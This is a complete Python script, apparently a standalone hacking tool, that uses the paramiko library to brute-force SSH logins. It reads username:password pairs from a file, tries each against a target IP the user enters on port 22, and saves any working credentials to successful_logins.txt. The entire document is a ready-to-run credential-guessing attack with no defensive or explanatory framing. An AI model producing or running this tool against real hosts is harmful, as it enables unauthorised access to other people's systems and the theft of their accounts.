import paramiko
import socket


def ssh_brute_force(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
        print(f"[+] SUCCESS: {username}:{password}")
        with open("successful_logins.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
    except (socket.timeout, paramiko.SSHException):
        print(f"[!] Timeout or SSH error for {username}:{password}")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    finally:
        client.close()

    return False
if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    port = 22

    with open("ssh_password.txt", "r") as f:
        combos = [line.strip().split(":") for line in f.readlines()]

    for username, password in combos:
        if ssh_brute_force(target_ip, port, username, password):
            print()
            break
